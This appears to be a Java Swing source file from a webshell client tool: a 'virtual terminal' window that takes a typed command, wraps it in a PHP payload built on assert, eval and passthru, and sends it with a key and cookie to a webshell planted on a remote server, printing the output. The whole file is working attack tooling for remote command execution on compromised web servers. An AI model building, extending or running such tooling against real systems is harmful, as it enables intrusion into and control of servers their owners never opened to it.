import java.awt.BorderLayout;


import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.border.TitledBorder;
import javax.swing.text.DefaultCaret;
import javax.swing.JTextPane;
import javax.swing.text.Document;


public class ConsoleGui extends JFrame {
	//这玩意干啥的。。不懂。。
	//private static final long serialVersionUID = 1L;

	private JTextField tf_cmd;
	private JButton btn_run;
	private JTextArea ta_result;

	private Process process;
	private PrintWriter out;
	
	private String payload; //最后发出的完整payload

	public ConsoleGui(WebShell webshell) {
		// 窗体大小
		this.setPreferredSize(new Dimension(500, 500));
		try {
			this.setIconImage(new ImageIcon(getClass().getResource("images/logo.png")).getImage());
		}catch(Exception e) {
			System.out.println(e.getMessage());
		}
		this.setTitle("虚拟终端");

		// 命令框及按钮
		TitledBorder titledBorder = new TitledBorder("Command input");
		JPanel topPanel = new JPanel(new BorderLayout());
		topPanel.setBorder(titledBorder);

		topPanel.add(tf_cmd = new JTextField(), BorderLayout.CENTER);
		topPanel.add(btn_run = new JButton("执行"), BorderLayout.EAST);
		tf_cmd.setFocusTraversalKeysEnabled(false);

		this.getContentPane().add(topPanel, BorderLayout.NORTH);

		// 显示结果
		JScrollPane resultPanel = new JScrollPane(ta_result = new JTextArea(10, 10));
		this.getContentPane().add(resultPanel);
		((DefaultCaret) ta_result.getCaret()).setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);

		/*防止子窗口关闭时父窗口也一起关闭*/
		this.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		this.addWindowListener(new WindowAdapter() {// 监听退出事件
			public void windowClosing(WindowEvent e) {
				//MainUi.RecoverFrame(); // 使main窗口取消禁用
				dispose();// 释放当前窗口资源，并且设置为不可见
			}
		});

		this.tf_cmd.addKeyListener(new KeyAdapter() {
			@Override
			public void keyReleased(KeyEvent e) {
				// 命令框中按下回车键的事件
				if (e.getKeyCode() == KeyEvent.VK_ENTER) {
					btn_run.doClick();
					tf_cmd.setText("");
				}
			}
		});

		// 执行按钮 发送命令
		this.btn_run.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				if (tf_cmd.getText().equals(""))
					return;
			
				payload = "assert|eval('echo \"[S]\";echo passthru(\"" 
				           + tf_cmd.getText() + "\");echo \"[E]\";')";
				try {
					//System.out.println(payload);
					webshell.getKeyAndCookie();
					String html = webshell.sendPayload(payload);
					ta_result.append(html+"\n");
				}catch(Exception a) {
					System.out.println(a.getMessage()); 
				}
			}
		});
	}
	
	/*显示Frame*/
	public void showFrame() {
		this.pack();
		this.setVisible(true);
	}
}